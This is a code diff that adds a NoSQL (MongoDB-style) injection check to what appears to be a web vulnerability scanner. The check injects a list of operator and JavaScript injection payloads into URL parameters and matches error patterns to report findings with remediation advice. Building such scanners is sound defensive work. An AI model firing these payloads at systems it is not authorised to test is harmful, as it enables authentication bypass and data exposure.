@@ -1040,6 +1040,70 @@ def test_open_redirect(url: str) -> list[Finding]:
 
 
 # ---------------------------------------------------------------------------
+# NoSQL injection (MongoDB-style: $where, $gt, $ne, operator injection)
+# ---------------------------------------------------------------------------
+
+NOSQLI_ERROR_PATTERNS = [
+    re.compile(r"SyntaxError|Unexpected token|JSON\.parse|Invalid.*JSON", re.IGNORECASE),
+    re.compile(r"MongoError|MongoDB|BSON|ObjectId|Cast to.*failed", re.IGNORECASE),
+    re.compile(r"mongodb|mongoose|NoSQL", re.IGNORECASE),
+    re.compile(r"\$where|\$gt|\$ne|\$regex|\$eq", re.IGNORECASE),
+]
+
+# URL/query param payloads (often passed as JSON to backend)
+NOSQLI_PAYLOADS = [
+    "' || 1==1 || '",
+    "' || 1==1--",
+    "'; return true; var a='",
+    "1'; return true;//",
+    '{"$gt": ""}',
+    '{"$ne": null}',
+    '{"$regex": ".*"}',
+    "' && this.password.match(/.*/)//",
+    "admin' || '1'=='1",
+    "1 || 1",
+]
+
+
+def test_nosqli(url: str) -> list[Finding]:
+    """Probe for NoSQL (e.g. MongoDB) injection via URL params; error-based detection."""
+    findings: list[Finding] = []
+    _t0 = time.time()
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    if not params:
+        return findings
+    baseline = _get_baseline(url)
+    baseline_text = baseline.text if baseline else ""
+
+    for param_name in list(params.keys()):
+        if _budget_expired(_t0):
+            return findings
+        for payload in randomize_order(NOSQLI_PAYLOADS):
+            for pn, test_url in _inject_into_params(url, payload, [param_name]):
+                try:
+                    resp = SESSION.get(test_url, timeout=TIMEOUT, allow_redirects=False)
+                    if resp.status_code != 200:
+                        continue
+                    for pat in NOSQLI_ERROR_PATTERNS:
+                        if pat.search(resp.text) and (not baseline_text or not pat.search(baseline_text)):
+                            findings.append(Finding(
+                                title=f"NoSQL Injection (error-based) via '{pn}'",
+                                severity="High",
+                                url=test_url,
+                                category="OWASP-A03 Injection (NoSQLi)",
+                                evidence=f"Payload: {payload}\nResponse matched pattern: {pat.pattern[:60]}",
+                                impact="Backend may be parsing input as NoSQL operators; can lead to auth bypass or data exposure.",
+                                remediation="Validate and sanitize input; do not pass user input directly into NoSQL queries or operators.",
+                                cvss="8.6 (High)",
+                            ))
+                            return findings
+                except requests.RequestException:
+                    continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
 # Sensitive file / directory discovery
 # ---------------------------------------------------------------------------
 
@@ -1245,6 +1309,7 @@ def run(target_url: str, scan_type: str = "full", crawl_depth: int = 2) -> str:
     test_map = (
         ("xss", "XSS", test_xss),
         ("sqli", "SQLi", test_sqli),
+        ("nosqli", "NoSQLi", test_nosqli),
         ("csrf", "CSRF", test_csrf),
         ("traversal", "Traversal", test_traversal),
         ("ssrf", "SSRF", test_ssrf),
